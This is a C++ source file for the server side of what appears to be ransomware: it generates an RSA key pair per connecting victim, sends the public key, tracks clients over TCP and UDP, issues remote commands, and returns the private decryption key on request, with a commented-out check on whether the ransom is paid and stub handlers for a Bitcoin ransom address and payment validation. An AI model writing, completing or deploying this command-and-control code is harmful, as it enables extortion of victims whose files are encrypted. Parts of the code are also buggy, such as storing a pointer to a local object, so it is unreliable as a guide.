#include "../Headers/server.h"
#include "../Headers/serialization.h"

#include <openssl/evp.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>

RSAKeys ServerInterface::GenerateRSAPair() {
	EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, nullptr);
	if ( ctx == NULL )
		return {};

	if ( EVP_PKEY_keygen_init(ctx) <= 0 )
		return {};

	if ( EVP_PKEY_CTX_set_rsa_keygen_bits(ctx, 1024) <= 0 )
		return {};

	EVP_PKEY* key = nullptr;
	if ( EVP_PKEY_keygen(ctx, &key) <= 0 ) {
		EVP_PKEY_CTX_free(ctx);
		return {};
	}

	BIO* priv = BIO_new(BIO_s_mem());
	BIO* pub  = BIO_new(BIO_s_mem());

	if ( PEM_write_bio_PrivateKey(priv, key, nullptr, nullptr, 0, nullptr, nullptr) <= 0 ) {
		EVP_PKEY_CTX_free(ctx);
		BIO_free(priv);
		BIO_free(pub);
		EVP_PKEY_free(key);
		return {};
	}

	if ( PEM_write_bio_PUBKEY(pub, key) <= 0 ) { 
		EVP_PKEY_CTX_free(ctx);
		BIO_free(priv);
		BIO_free(pub);
		EVP_PKEY_free(key);
		return {};
	}

	EVP_PKEY_CTX_free(ctx);
	EVP_PKEY_free(key);

	return std::make_pair(pub, priv);
}

void ServerInterface::ListenForUDPMessages() {

	// UDP requests are not encrypted.
	sockaddr_in recvAddr;
	int addrSize = sizeof(recvAddr);

	std::cout << "Listening for udp messages\n";

	// receive while udp server is alive
	while ( this->UDPServerDetails.alive == TRUE ) {
		ClientRequest req;
		sockaddr_in   incomingAddr;
		BOOL		  received = NetCommon::ReceiveData(req, this->UDPServerDetails.sfd, UDP, incomingAddr);
		if ( !received )
			continue;

		std::cout << "Received a message on the UDP socket." << std::endl;
		PerformUDPRequest(req, incomingAddr);
	}
	std::cout << "Not receiving\n";
}

void ServerInterface::ShutdownServer(BOOL confirm) {
	if ( !confirm ) return;

	this->TCPServerDetails.alive = FALSE;
	ShutdownSocket(this->TCPServerDetails.sfd, 2); // shutdown server socket for both read and write
	CloseSocket(this->TCPServerDetails.sfd);
	this->TCPServerDetails = {}; // set server details to new blank server structure
}

BOOL ServerInterface::PerformTCPRequest(ClientMessage req, long cuid) {
	BOOL		  success = FALSE;
	Client*		  client  = GetClientData(cuid).first; // client who made the request
	ServerCommand responseCommand;

	if ( !ClientIsInClientList(cuid) )
		return success;

	switch ( req.action ) {
	case ClientMessage::REQUEST_PRIVATE_ENCRYPTION_KEY:
		//if ( !IsRansomPaid(client) ) {
		//	success = FALSE;
		//	break;
		//}

		responseCommand.action = RemoteAction::RETURN_PRIVATE_RSA_KEY;
		//responseCommand.publicEncryptionKey = NetCommon::ConvertBIOToString(client.RSAPublicKey);
		responseCommand.privateEncryptionKey = Serialization::ConvertBIOToString(client->RSAPrivateKey);
		success = TCPSendMessageToClient(cuid, responseCommand);
		std::cout << "sending\n";

		break;
	case ClientMessage::REQUEST_RANSOM_BTC_ADDRESS:
		break;
	case ClientMessage::VALIDATE_RANSOM_PAYMENT:
		break;
	}
}

void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
	std::cout << "New thread created to receive messages from client " << cuid << std::endl;
	Client* client = GetClientPtr(cuid);
	BOOL receiving = FALSE;

	if ( client == nullptr )
		return;
	
	// tcp receive main loop
	do 
	{
		// get a client response usually after an action is performed on the remote host
		if ( client->ExpectingResponse ) {
			std::cout << "expecting response\n";
			client->LastClientResponse = client->RecentClientResponse;
			client->RecentClientResponse = ReceiveDataFrom<ClientResponse>(this->TCPServerDetails.sfd, TRUE, client->RSAPrivateKey);
			continue;
		}
		
		// receive data from client, decrypt it using their rsa key
		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(client->TCPSocket, TRUE, client->RSAPrivateKey);
		receiving = receivedData.valid;

		PerformTCPRequest(receivedData, cuid);
	} 
	while ( receiving );
}

BOOL ServerInterface::SendTCPClientRSAPublicKey(long cuid, BIO* pubKey) {
	if ( !ClientIsInClientList(cuid) )
		return FALSE;

	Client* client = GetClientData(cuid).first;

	std::string bio = Serialization::ConvertBIOToString(pubKey); // pub key as a string
	std::string base64 = macaron::Base64::Encode(bio);  
	BYTESTRING buffer = Serialization::SerializeString(base64);

	BOOL sent = NetCommon::TransmitData(buffer, client->TCPSocket, TCP);
	std::cout << "Sent RSA Pub Key (B64): " << base64 << std::endl;

	return TRUE;
}

void ServerInterface::AcceptTCPConnections() {
	while ( this->ClientList.size() < MAX_CON && this->TCPServerDetails.alive == TRUE )
	{
		// accept
		sockaddr_in addr = {};
		int size = sizeof(sockaddr_in);
		
		SOCKET clientSocket = AcceptOnSocket(this->TCPServerDetails.sfd, reinterpret_cast<sockaddr*>( &addr ), &size);
		if ( clientSocket == INVALID_SOCKET )
			continue;

		std::cout << "Accepted a client on the tcp server." << std::endl;

		Client  newClient(clientSocket, 0, addr);
		RSAKeys keys = GenerateRSAPair();
		newClient.RSAPublicKey  = keys.first;
		newClient.RSAPrivateKey = keys.second;

		AddToClientList(newClient); // add them to the client list
		
		SendTCPClientRSAPublicKey(newClient.ClientUID, newClient.RSAPublicKey);
		std::cout << "Good connection. Send TCP Client key\n";

		// start receiving tcp data from that client for the lifetime of that client
		std::thread receive(&ServerInterface::TCPReceiveMessagesFromClient, this, newClient.ClientUID);
		receive.detach();

		// TODO: make it so we can send information to the client
	}
}

Server ServerInterface::NewServerInstance(SocketTypes serverType, int port) {
	Server server = {};
	
	if ( !NetCommon::WSAInitialized )
		NetCommon::LoadWSAFunctions();

	// create socket for server type
	// update server fields
	if ( serverType == TCP ) {
		server.sfd = CreateSocket(AF_INET, SOCK_STREAM, 0);
		if ( server.sfd == INVALID_SOCKET )
			return server;

		server.type = SOCK_STREAM;
	} else if ( serverType == UDP) {
		server.sfd = CreateSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if ( server.sfd == INVALID_SOCKET )
			return server;
		server.type = SOCK_DGRAM;
	}

	//hostent* host = GetHostByName(DNS_NAME.c_str());

	// update server fields
	//memcpy(&server.addr.sin_addr, host->h_addr_list[0], host->h_length);
	
	server.addr.sin_addr.s_addr = INADDR_ANY;
	server.addr.sin_family	    = AF_INET;
	server.addr.sin_port        = htons(port);
	server.port                 = port;
	server.alive = TRUE;

	std::cout << "Created server on port: " << port << std::endl;

	return server;
}

BOOL ServerInterface::StartServer(Server& server) {
	if ( server.sfd == INVALID_SOCKET )
		return FALSE;

	// bind
	int status = SOCKET_ERROR;
	status = BindSocket(server.sfd, ( sockaddr* ) &server.addr, sizeof(server.addr));
	if ( status == SOCKET_ERROR )
		return FALSE;

	server.alive = TRUE;

	// listen if TCP server
	if ( server.type == SOCK_STREAM ) {
		status = SocketListen(server.sfd, SOMAXCONN);
		if ( status == SOCKET_ERROR )
			return FALSE;

		this->TCPServerDetails = server;

		// start accepting
		std::thread acceptThread(&ServerInterface::AcceptTCPConnections, this);
		acceptThread.detach(); // run accept thread even after this function returns
	}
	// otherwise if not tcp server then listen for udp messaages
	else if ( server.type == SOCK_DGRAM ) {
		this->UDPServerDetails = server;

		std::thread receiveThread(&ServerInterface::ListenForUDPMessages, this);
		receiveThread.detach();
	}

	return TRUE;
}

BOOL ServerInterface::TCPSendMessageToClient(long cuid, ServerCommand& req) {
	Client* c = GetClientData(cuid).first;
	return NetCommon::TransmitData(req, c->TCPSocket, TCP);
}

ClientResponse ServerInterface::WaitForClientResponse(long cuid) {
	Client* client = GetClientPtr(cuid);
	if ( client == nullptr ) return {};

	client->ExpectingResponse = TRUE;

	// wait until new client response
	do {
		Sleep(500); // wait 500 ms
	} 
	while ( client->RecentClientResponse.id != client->LastClientResponse.id );

	client->ExpectingResponse = FALSE;

	return client->RecentClientResponse;
}

BOOL ServerInterface::UDPSendMessageToClient(Client clientInfo, UDPMessage& message) {
	message.isValid = TRUE;
	return NetCommon::TransmitData(message, this->UDPServerDetails.sfd, UDP, clientInfo.AddressInfo);
}

BOOL ServerInterface::PerformUDPRequest(ClientMessage req, sockaddr_in incomingAddr) {
	BOOL success = FALSE;
	
	// udp isnt encrypted, which is why we want to get out of udp as fast as possible
	// only serialized as a bytestring to send over sockets
	if ( !req.valid )
		return FALSE;

	std::cout << "Performing UDP request. Action: " << req.action << std::endl;

	switch ( req.action ) {
	case ClientMessage::CONNECT_CLIENT:	
		Client client(req.tcp, req.udp, incomingAddr);
		
		std::cout << "Client: " << client.UDPSocket  << std::endl;

		// client wants to connect so respond with tcp server details
		hostent* host = GetHostByName(DNS_NAME.c_str());

		Server temp = this->TCPServerDetails;
		memcpy(&temp.addr.sin_addr, host->h_addr_list[0], host->h_length);

		UDPMessage response = {};
		response.isValid = TRUE;
		response.TCPServer = temp;

		if ( UDPSendMessageToClient(client, response) )
			success = TRUE;
		break;
	}

	return success;
}

/*
	Get the client data from a client
	in the client list using CUID.

	return value:
	.first is Client class
	.second is rsa keys
*/
const ClientData ServerInterface::GetClientData(long cuid) {
	if ( !ClientIsInClientList(cuid) )
		return std::pair<Client*, RSAKeys>({}, {}); // empty tuple

	return GetClientList().at(cuid);
}

Client* ServerInterface::GetClientPtr(long cuid) {
	if ( !ClientIsInClientList(cuid) ) return nullptr;
	return this->ClientList.at(cuid).first;
}

std::unordered_map<long, ClientData>& ServerInterface::GetClientList() {
	std::lock_guard<std::mutex> lock(ClientListMutex);
	return this->ClientList;
}

ClientResponse ServerInterface::PingClient(long cuid) {
	if ( !ClientIsInClientList(cuid) )
		return {};

	ClientData clientInfo = GetClientData(cuid);
	Client*    client     = clientInfo.first;
	if ( client->TCPSocket == INVALID_SOCKET ) // socket isnt ready so cant ping.
		return {};

	// send the ping to the client over tcp
	ServerCommand pingCommand;
	pingCommand.action = RemoteAction::PING_CLIENT;
	pingCommand.valid = TRUE;
	
	BOOL sent = TCPSendMessageToClient(cuid, pingCommand);
	if ( !sent )
		return {};

	return WaitForClientResponse(cuid);
}

template <typename _Struct>
_Struct ServerInterface::ReceiveDataFrom(SOCKET s, BOOL encrypted, BIO* rsaKey)
{
	_Struct outData;
	BOOL received = NetCommon::ReceiveData(outData, s, SocketTypes::TCP, NetCommon::_default, encrypted, rsaKey);
	if ( !received )
		return {};

	return outData;
}

BOOL ServerInterface::ClientIsInClientList(long cuid) {
	return GetClientList().contains(cuid);
}

BOOL ServerInterface::AddToClientList(Client client) {
	std::cout << "Adding client to list\n";
	
	ClientListMutex.lock();
	
	RSAKeys    keys = std::make_pair(client.RSAPublicKey, client.RSAPrivateKey);
	ClientData pair = std::make_pair(&client, keys);
	std::pair<long, ClientData> clientListValue = std::make_pair(client.ClientUID, pair);
	
	this->ClientList.insert(clientListValue);
	
	ClientListMutex.unlock();
	
	return TRUE;
}

//template <typename Data>
//Data ServerInterface::DecryptClientData(BYTESTRING cipher, long cuid) {
//	if ( !ClientIsInClientList(cuid) )
//		return {};
//
//	ClientData  clientInfo    = GetClientData(cuid);
//	BIO*        decryptionKey = clientInfo.second.first;
//	Data        decrypted     = NetCommon::DecryptInternetData<Data>(cipher, decryptionKey);
//	
//	return decrypted;
//}
//
//ClientRequest ServerInterface::DecryptClientRequest(long cuid, BYTESTRING req) {
//	return DecryptClientData<ClientRequest>(req, cuid); // return decrypted clientRequest struct
//}
//
//ClientResponse ServerInterface::DecryptClientResponse(long cuid, BYTESTRING resp) {
//	return DecryptClientData<ClientResponse>(resp, cuid);
//}